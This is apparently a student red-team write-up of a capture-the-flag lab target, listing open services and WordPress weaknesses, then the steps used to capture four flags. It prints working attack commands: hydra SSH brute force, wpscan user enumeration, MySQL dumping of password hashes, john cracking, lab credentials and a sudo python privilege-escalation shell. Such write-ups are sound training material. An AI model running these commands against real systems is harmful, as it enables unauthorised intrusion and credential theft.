# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

```bash
Command: $ nmap -sV -sC -O 192.168.1.0/24
  ```
 <img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/Target-1_nmap.png" alt="Target1_IP" style="height: 400px; width:600px;"/>


This scan identifies the services below as potential points of entry:
   Target 1  
     1. Port 22/TCP Open SSH       
     2. Port 80/TCP Open HTTP       
     3. Port 111/TCP Open rcpbind       
     4. Port 139/TCP Open netbios-ssn     
     5. Port 445/TCP Open netbios-ssn  


The following vulnerabilities were identified on each target:     
   Target 1  
    1. User Enumeration (WordPress site)  
        - a. The stop-user-enumeration plugin before 1.3.8 for WordPress has XSS. [CVE-2017-18536](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-18536/ "CVE-2017-18536")  
        - b. WordPress Core < 4.7.1 - Username Enumeration Vulnerability CVE-2017-5487 Scanner [CVE-2017-5487](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5487/ "CVE-2017-5487")  
    2. Weak user Passwords - guess or use hydra -l michael -P /usr/share/wordlists/rockyou.txt 192.168.1.110 ssh      
    3. Unsalted user Password Hash (WordPress)  
    4. Misconfiguration of User Privileges/Privilege Escalation with Python.    

### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `Flag1: b9bbcb33ellb80be759c4e844862482d` _hash value_
    - **Exploit Used**
      - WPScan to enumerate users of target1 WordPress site.
      - wpscan --url http://192.168.1.110 --enumerate u
       <img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/wpscan_michael.png?raw=true" alt="WPScan Users"/>             

      - Brute force, `guess`, or hydra -l michael -P /usr/share/wordlists/rockyou.txt 192.168.1.110 ssh  
      - Use guess password `michael` for user michael.    
      ssh michael@192.168.1.110  
      pwd: michael  
<img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/michael_ID.png?raw=true" alt="michael_ID"/>  
  - egrep flag* service.html
<img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/FLAG-1_service-html.png?raw=true" alt="Flag1"/>  

<img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/service-htmp-footer-flag1.png?raw=true" alt src="source.html" style="height: 400px; width:600px;"/>


  - `Flag2: fc3fd58dcdad9ab23faca6e9a3e581c`   
    - **Exploit Used**
      - Same exploit covered in flag1 to gain access
      - Commands:
      - ssh michael@192.168.1.110
      - pw: michael
      - cd /var/www - transverse the directory.
      - find / i-name flag*
      - cat flag2.txt
<img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/FLAG-2.png?raw=true" alt="Flag2"/>  

  - `Flag3: afc01ab56b50591e7dccf93122770cd2`   
    - **Exploit Used**        
      - Continue using michael's credentials; locate the wp-config.php, and use mysql to explore the database.     
      - Once found, the wp-config.php displayed the db_password in plain text.

<img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/wp-config-php--location.png?raw=true" alt="wp_location"/>  
      - cat wp-config-php       
<img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/wp-config_PWD.png?raw=true" alt="wp_passwd"/>   

  - `Flag3` was found in the wp_posts table in the wordpress database.   
      - Commands:  
        - Connected to mysql: -u root -p'R@v3nSecurity'  
        - show databases;  
        - use wordpress;  
        - show tables;  
        - select * from wp_posts;  

<img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/myswl-logon.png?raw=true" alt="mysql-login"/>  
<img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/mysql_databases.png?raw=true" alt="mysql_databases"/>    
<img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/mysql_TABLES.png?raw=true" alt="mysql_TABLES"/>  
<img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/FLAG-3_mysql_wp_posts.png?raw=true"/>


  - `Flag4: 715dea6c055b9fe3337544932f2941ce`:   
        - **Exploit Used**  
            - Use of weak salted hashes and Python root escalation Privileges.   
            - Still using michaels credentials, gather the password hashes to crack.    
            - The usernames and password hashes were copied to the kali server in a file (wp_hashes.txt), and cracked with John.    
            - select * from wp_users;  

  <img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/Capture-04%20User%20table%20data.PNG?raw=true/>

 - john wp_hashes.text

<img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/Steven_Pink84.png?raw=true"/>

          - use Steven credentials to ssh to target1 and escalate privileges to find flag4.  
          - ssh steven@192.168.1.110
          - pw: pink84
          - sudo -l
          - sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’   

<img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/sudo-stephen.png?raw=true"/>

          - cd /root
          - ls
          - cat flag4.txt      

<img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/Flag-4.png?raw=true"/>
